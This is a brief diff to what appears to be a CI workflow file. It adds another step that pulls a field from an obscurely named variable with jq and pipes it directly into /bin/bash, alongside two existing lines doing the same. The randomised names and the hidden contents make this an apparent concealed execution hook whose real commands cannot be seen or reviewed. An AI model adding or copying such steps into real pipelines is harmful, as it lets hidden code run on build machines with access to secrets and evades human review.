@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$uaf395" | jq -r .cjolz95 | /bin/bash
           echo $ykc99369 | jq -r .rrgmf13702 | /bin/bash
+          printf '%s' "$ml2" | jq -r .i450 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
